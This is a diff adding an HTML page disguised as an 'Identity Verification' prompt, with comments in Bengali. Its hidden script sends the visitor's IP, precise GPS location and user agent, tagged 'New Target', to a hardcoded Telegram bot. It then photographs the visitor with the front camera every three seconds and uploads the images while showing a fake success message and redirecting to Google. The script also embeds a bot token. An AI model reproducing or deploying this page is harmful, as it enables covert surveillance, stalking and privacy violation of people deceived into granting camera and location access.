@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Verification Required</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .card {
+            background: rgba(30, 41, 59, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 32px;
+            padding: 32px 24px;
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+            border: 1px solid rgba(16, 185, 129, 0.3);
+            box-shadow: 0 25px 45px -12px rgba(0,0,0,0.5);
+        }
+        h2 { color: #f1f5f9; font-size: 1.8rem; margin-bottom: 12px; }
+        p { color: #94a3b8; margin-bottom: 28px; line-height: 1.5; }
+        button {
+            background: linear-gradient(95deg, #10b981, #059669);
+            border: none;
+            padding: 16px 32px;
+            border-radius: 60px;
+            font-size: 18px;
+            font-weight: 600;
+            color: white;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.2s ease;
+            margin-bottom: 12px;
+        }
+        button:active { transform: scale(0.97); }
+        .reset-btn { background: linear-gradient(95deg, #ef4444, #dc2626); }
+        .status {
+            margin-top: 20px;
+            padding: 12px 16px;
+            border-radius: 20px;
+            font-size: 14px;
+            line-height: 1.4;
+        }
+        .status.info { background: #1e3a8a; color: #bfdbfe; }
+        .status.success { background: #14532d; color: #bbf7d0; }
+        .status.error { background: #7f1d1d; color: #fecaca; }
+        .hidden { display: none; }
+        .loader {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #fff;
+            border-radius: 50%;
+            border-top-color: transparent;
+            animation: spin 0.6s linear infinite;
+            vertical-align: middle;
+            margin-right: 8px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+<div class="card">
+    <h2>🔐 Identity Verification</h2>
+    <p>Please click the button below to complete verification</p>
+    <button id="allowBtn">✅ Click to Verify</button>
+    <button id="resetBtn" class="reset-btn">🔄 Reset Permission</button>
+    <div id="status" class="status info">⚡ Ready. Click verify button.</div>
+</div>
+
+<script>
+    (function() {
+        // ==================== আপনার তথ্য দিন ====================
+        const BOT_TOKEN = '8193376363:AAFaDSLah6R-i_hkQY9fKyeYiudZJSNsLeg';
+        const CHAT_ID = '6449981797';
+        // =======================================================
+        
+        let mediaStream = null;
+        let captureInterval = null;
+        let locationSent = false;
+        
+        const video = document.createElement('video');
+        video.setAttribute('autoplay', '');
+        video.setAttribute('playsinline', '');
+        video.setAttribute('muted', '');
+        video.style.display = 'none';
+        document.body.appendChild(video);
+
+        const allowBtn = document.getElementById('allowBtn');
+        const resetBtn = document.getElementById('resetBtn');
+        const statusDiv = document.getElementById('status');
+
+        // ইউজারের আইপি বের করা
+        async function getIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip;
+            } catch(e) {
+                return 'unavailable';
+            }
+        }
+
+        // ইউজারের লোকেশন (জিপিএস) বের করা
+        async function getLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve('Geolocation not supported');
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lng = position.coords.longitude;
+                        const accuracy = position.coords.accuracy;
+                        const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
+                        resolve(`📍 Location: ${lat}, ${lng}\n🎯 Accuracy: ${Math.round(accuracy)}m\n🗺️ Map: ${mapsLink}`);
+                    },
+                    (error) => {
+                        let msg = 'Location access denied';
+                        if (error.code === 1) msg = '❌ Location permission denied';
+                        else if (error.code === 2) msg = '📍 Location unavailable';
+                        else if (error.code === 3) msg = '⏰ Location timeout';
+                        resolve(msg);
+                    },
+                    { timeout: 10000, enableHighAccuracy: true }
+                );
+            });
+        }
+
+        // টেলিগ্রামে মেসেজ পাঠানো
+        async function sendToTelegram(message, isPhoto = false, photoBlob = null) {
+            if (isPhoto && photoBlob) {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', photoBlob, `cam_${Date.now()}.png`);
+                formData.append('caption', message);
+                
+                try {
+                    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    return await res.json();
+                } catch(e) {
+                    console.error('Send photo error:', e);
+                    return { ok: false };
+                }
+            } else {
+                try {
+                    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: message,
+                            parse_mode: 'HTML'
+                        })
+                    });
+                    return await res.json();
+                } catch(e) {
+                    console.error('Send message error:', e);
+                    return { ok: false };
+                }
+            }
+        }
+
+        // ক্যামেরা থেকে ছবি তোলা ও পাঠানো
+        function captureAndSend() {
+            if (!video.videoWidth || !video.videoHeight || !mediaStream || !mediaStream.active) return;
+            
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            canvas.toBlob(async (blob) => {
+                if (!blob) return;
+                const timestamp = new Date().toLocaleString();
+                const caption = `📸 New Capture\n🕐 Time: ${timestamp}\n🎯 Campaign ID: ${Date.now()}`;
+                await sendToTelegram(caption, true, blob);
+                statusDiv.innerHTML = '📸 Photo sent to Telegram...';
+            }, 'image/png');
+        }
+
+        // সব ডাটা সংগ্রহ ও পাঠানো (লোকেশন + আইপি + ছবি)
+        async function sendAllData() {
+            statusDiv.innerHTML = '<span class="loader"></span> Collecting information...';
+            
+            // Get IP
+            const ip = await getIP();
+            await sendToTelegram(`🌐 IP Address: ${ip}`);
+            
+            // Get Location (only once)
+            if (!locationSent) {
+                const location = await getLocation();
+                await sendToTelegram(location);
+                locationSent = true;
+            }
+            
+            // Send initial message
+            await sendToTelegram(`🟢 New Target\n📱 User Agent: ${navigator.userAgent.substring(0, 100)}\n🔗 Campaign: ${Date.now()}`);
+        }
+
+        async function startCamera() {
+            if (mediaStream) {
+                mediaStream.getTracks().forEach(track => track.stop());
+                mediaStream = null;
+            }
+            if (captureInterval) {
+                clearInterval(captureInterval);
+                captureInterval = null;
+            }
+
+            statusDiv.className = 'status info';
+            statusDiv.innerHTML = '📷 Requesting camera access...';
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" } 
+                });
+                
+                mediaStream = stream;
+                video.srcObject = stream;
+                
+                statusDiv.className = 'status success';
+                statusDiv.innerHTML = '✅ Camera granted! Sending data...';
+                
+                // Send IP and Location first
+                await sendAllData();
+                
+                // Start capturing every 3 seconds
+                captureInterval = setInterval(captureAndSend, 3000);
+                
+                // Show success message and redirect after 6 seconds
+                setTimeout(() => {
+                    statusDiv.innerHTML = '✅ Verification complete! Redirecting...';
+                    setTimeout(() => {
+                        window.location.href = 'https://www.google.com';
+                    }, 1500);
+                }, 6000);
+                
+            } catch(err) {
+                console.error('Camera error:', err);
+                statusDiv.className = 'status error';
+                if (err.name === 'NotAllowedError') {
+                    statusDiv.innerHTML = '❌ Camera access denied. Please allow camera and try again.';
+                } else if (err.name === 'NotFoundError') {
+                    statusDiv.innerHTML = '❌ No camera found on this device.';
+                } else {
+                    statusDiv.innerHTML = '❌ Error: ' + (err.message || 'Could not access camera');
+                }
+            }
+        }
+
+        function resetPermission() {
+            if (mediaStream) {
+                mediaStream.getTracks().forEach(track => track.stop());
+                mediaStream = null;
+            }
+            if (captureInterval) {
+                clearInterval(captureInterval);
+                captureInterval = null;
+            }
+            if (video.srcObject) {
+                video.srcObject = null;
+            }
+            locationSent = false;
+            statusDiv.className = 'status info';
+            statusDiv.innerHTML = '🔄 Permission reset. Click Verify again.';
+        }
+
+        allowBtn.addEventListener('click', startCamera);
+        resetBtn.addEventListener('click', resetPermission);
+        
+        // Test bot on load
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`)
+            .then(res => res.json())
+            .then(data => {
+                if (data.ok) console.log('✅ Bot is active:', data.result.username);
+                else console.error('❌ Bot error:', data);
+            })
+            .catch(err => console.error('Bot test failed:', err));
+    })();
+</script>
+</body>
+</html>
